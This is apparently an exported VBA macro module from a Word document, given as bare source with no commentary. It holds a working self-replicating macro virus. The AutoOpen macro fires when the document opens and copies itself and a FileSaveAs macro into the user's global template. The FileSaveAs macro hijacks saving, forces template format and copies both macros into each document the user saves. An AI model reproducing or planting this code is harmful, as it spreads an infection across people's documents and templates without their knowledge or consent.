   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim FName$
   Dim MacName$

       Dim NewFSA As Object: Set NewFSA = WordBasic.DialogRecord.FileSaveAs(False)

   On Error GoTo -1: On Error GoTo Escape

       WordBasic.CurValues.FileSaveAs NewFSA

       WordBasic.Dialog.FileSaveAs NewFSA

       If NewFSA.Format = 0 Then NewFSA.Format = 1

       FName$ = WordBasic.[FileName$]()

       MacName$ = FName$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoOpen", MacName$

       MacName$ = FName$ + ":FileSaveAs"
       WordBasic.MacroCopy "Global:FileSaveAs", MacName$

       WordBasic.FileSaveAs NewFSA

       GoTo Done

   Escape:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs NewFSA
   End If

   Done:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Number_of_Macros
   Dim count_
   Dim AllreadyInstalled
   Dim UnContagable
   Dim name_of_file$
   Dim CopiedMacro$

   On Error GoTo -1: On Error GoTo Abort

       Number_of_Macros = WordBasic.CountMacros(0, 0)

       For count_ = 1 To Number_of_Macros

           If WordBasic.[MacroName$](count_, 0, 0) = "AutoOpen" Then
               AllreadyInstalled = -1
           End If

           If WordBasic.[MacroName$](count_, 0, 0) = "FileSaveAs" Then
               UnContagable = -1
           End If
       Next count_

   If Not AllreadyInstalled And Not UnContagable Then

           name_of_file$ = WordBasic.[FileName$]()


           CopiedMacro$ = name_of_file$ + ":FileSaveAs"
           WordBasic.MacroCopy CopiedMacro$, "Global:FileSaveAs"

           CopiedMacro$ = name_of_file$ + ":AutoOpen"
           WordBasic.MacroCopy CopiedMacro$, "Global:AutoOpen"

       End If

   Abort:


   End Sub
